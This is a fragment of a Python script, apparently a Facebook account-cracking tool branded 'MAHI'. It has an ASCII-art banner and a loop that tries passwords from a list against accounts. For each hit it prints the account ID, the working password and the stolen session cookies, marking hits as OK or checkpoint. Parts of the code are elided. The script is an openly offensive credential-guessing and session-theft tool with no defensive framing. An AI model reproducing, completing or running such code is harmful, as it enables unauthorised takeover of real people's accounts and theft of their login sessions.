...
logo = (""""\033[132m                                                                                              
`7MMM.     ,MMF'      db      `7MMF'  `7MMF'`7MMF'
  MMMb    dPMM       ;MM:       MM      MM    MM  
  M YM   ,M MM      ,V^MM.      MM      MM    MM  
  M  Mb  M' MM     ,M  `MM      MMmmmmmmMM    MM  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[MAHI-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[MAHI-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(' %s[MAHI] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
